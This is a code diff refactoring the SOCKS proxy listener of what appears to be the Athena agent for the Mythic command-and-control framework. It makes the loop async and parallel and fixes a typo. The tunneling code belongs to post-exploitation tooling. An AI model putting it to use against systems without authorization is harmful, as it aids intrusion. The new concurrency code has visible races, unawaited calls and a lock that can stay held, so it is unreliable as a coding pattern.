@@ -34,64 +34,62 @@ namespace Athena.Commands.Model
         /// <summary>
         /// Start the SOCKS Listener
         /// </summary>
-        public bool Start()
+        public async Task<bool> Start() //this should be an async start
+        {
+            StartLoop();
+            return true;
+        }
+
+        private async Task StartLoop()
         {
             this.ct = new CancellationTokenSource();
             this.connections = new Dictionary<int, SocksConnection>();
             this.messagesOut = new ConcurrentBag<SocksMessage>();
 
             List<int> idsToRemove = new List<int>();
-
-            Task.Run(() =>
+            while (!this.ct.IsCancellationRequested)
             {
-                while (!this.ct.IsCancellationRequested)
+                //Get a new list so we don't have to worry about modifications while we loop
+                List<SocksConnection> conns = new List<SocksConnection>();
+                if (Monitor.TryEnter(_dictLock, 5000))
                 {
-                    //Get a new list so we don't have to worry about modifications while we loop
-                    List<SocksConnection> conns = new List<SocksConnection>();
-                    if (Monitor.TryEnter(_dictLock, 5000))
+                    try
                     {
-                        try 
-                        {
-                            conns = new List<SocksConnection>(this.connections.Values);
-                            Monitor.Exit(_dictLock);
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteDebug(e.Message);
-                        }
+                        conns = new List<SocksConnection>(this.connections.Values);
+                        Monitor.Exit(_dictLock);
                     }
-
-                    //Parallel for.each here instead?
-                    foreach (SocksConnection connection in conns)
+                    catch (Exception e)
                     {
-                        try
-                        {
-                            if (!connection.IsSocketDisposed) //Should I return a closed message back to Mythiic?
-                            {
-                                if (connection.Socket.Available > 0)
-                                {
-                                    byte[] buf = new byte[connection.Socket.Available];
-                                    //connection.ReceiveAsync();
-
-                                    //This should be replaced with ReceiveAsync in order to free up system resources
-                                    connection.Receive(buf);
-                                }
-                            }
-
-                            if (connection.exited)
-                            {
-                                idsToRemove.Add(connection.server_id);
-                            }
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                        }
+                        Misc.WriteDebug(e.Message);
                     }
-                    RemoveConnections(idsToRemove);
                 }
-            });
-            return true;
+
+                Parallel.ForEach(conns, connection =>
+                {
+                    try
+                    {
+                        if (!connection.IsSocketDisposed) //Should I return a closed message back to Mythiic?
+                        {
+                            if (connection.Socket.Available > 0)
+                            {
+                                byte[] buf = new byte[connection.Socket.Available];
+                                connection.ReceiveAsync();
+                            }
+                        } //else socket is disposed and we should return a closed message and remove it from our IDs?
+
+                        if (connection.exited)
+                        {
+                            idsToRemove.Add(connection.server_id);
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Misc.WriteError(e.Message);
+                    }
+                });
+
+                RemoveConnections(idsToRemove);
+            }
         }
 
         /// <summary>
@@ -152,7 +150,7 @@ namespace Athena.Commands.Model
             }
             else
             {
-                Misc.WriteDebug("Failed to removed connections from List");
+                Misc.WriteDebug("Failed to remove connections from List");
             }
             return false;
         }
@@ -248,7 +246,7 @@ namespace Athena.Commands.Model
                 {
                     //Add connection to tracker
 
-                    while (!AddConnection(sc)) { }
+                    while (!AddConnection(sc)) { } //This can be replaced by a thread-safe collection will need to explore more
                     cr.status = ConnectResponseStatus.Success;
                     smOut.exit = false;
                     //Add to our message queue
